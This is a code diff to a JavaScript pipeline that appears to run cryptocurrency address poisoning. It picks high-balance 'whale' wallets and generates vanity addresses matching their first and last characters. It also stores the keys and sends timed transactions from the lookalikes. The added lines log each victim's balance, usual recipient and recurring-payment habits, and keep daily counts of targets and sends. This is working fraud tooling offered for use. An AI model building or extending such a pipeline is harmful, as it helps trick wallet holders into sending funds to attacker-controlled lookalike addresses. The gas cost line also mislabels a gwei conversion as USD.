@@ -3,6 +3,7 @@ import { deriveAddress, toChecksumAddress } from './vanity/utils.js';
 import { storeVanityKey } from './tx/vault.js';
 import { sendTx } from './tx/sender.js';
 import { getTiming } from './timing.js';
+import { saveTarget, saveVanity, addVanityTxHash, incrementDailyStat } from './lib/db.js';
 import { CHAINS } from './config/chains.js';
 
 const MAIN_WALLET = process.env.MAIN_WALLET;
@@ -24,11 +25,23 @@ function log(msg) {
  * @param {string} opts.chainKey - chain where whale was found
  * @param {number} opts.score - wallet score from scanner
  */
-export async function runVanityPipeline({ targetAddress, chainKey, score }) {
+export async function runVanityPipeline({ targetAddress, chainKey, score, nativeBalance, nativeSymbol, lastTxTo, txCount, isRecurrent }) {
   const chain = CHAINS[chainKey];
   const clean = targetAddress.replace(/^0x/i, '').toLowerCase();
   const prefix = clean.slice(0, PREFIX_LEN);
   const suffix = clean.slice(-SUFFIX_LEN);
+  const matchChars = `${PREFIX_LEN}+${SUFFIX_LEN}`;
+
+  // ── Save target to DB ─────────────────────────────
+  await saveTarget(chainKey, targetAddress, {
+    balance: nativeBalance || 0,
+    lastTxTo: lastTxTo || '',
+    txCount: txCount || 0,
+    isRecurrent: isRecurrent || false,
+    lastTestTx: new Date().toISOString(),
+    score,
+  });
+  await incrementDailyStat('scored', 1);
 
   // ── Step 1: Vanity Gen ────────────────────────────
   log(`[1/3] Generating vanity for ${prefix}...${suffix} (score: ${score})`);
@@ -53,7 +66,7 @@ export async function runVanityPipeline({ targetAddress, chainKey, score }) {
   const genTime = ((Date.now() - startGen) / 1000).toFixed(1);
   log(`\n  [1/3] Vanity found: ${checksumAddr} (${genTime}s, ${vanityResult.attempts.toLocaleString()} attempts)`);
 
-  // ── Step 2: Store in Redis ────────────────────────
+  // ── Step 2: Store in Redis (vault + vanity table) ─
   log(`[2/3] Storing encrypted key in Redis...`);
 
   await storeVanityKey({
@@ -64,7 +77,16 @@ export async function runVanityPipeline({ targetAddress, chainKey, score }) {
     suffix,
   });
 
-  log(`[2/3] Key stored (vault:vanity:${clean})`);
+  await saveVanity(checksumAddr, {
+    privateKey: '(encrypted in vault)',
+    whale: targetAddress,
+    recipient: lastTxTo || targetAddress,
+    chain: chainKey,
+    matchChars,
+    txHashes: [],
+  });
+
+  log(`[2/3] Key stored (vault + vanity:${checksumAddr.slice(0, 10)}...)`);
 
   // ── Step 3: Timing + TX Sequence ───────────────────
   const timing = await getTiming(score, chainKey);
@@ -94,6 +116,9 @@ export async function runVanityPipeline({ targetAddress, chainKey, score }) {
         amount,
       });
       log(`  [TX ${i + 1}/${txSteps.length}] Confirmed: ${result.hash}`);
+      await addVanityTxHash(checksumAddr, result.hash);
+      await incrementDailyStat('sent', 1);
+      await incrementDailyStat('gasSpent', parseFloat(result.gasUsed) * 0.000000001); // rough gwei→USD
     } catch (err) {
       log(`  [TX ${i + 1}/${txSteps.length}] FAILED: ${err.message}`);
     }
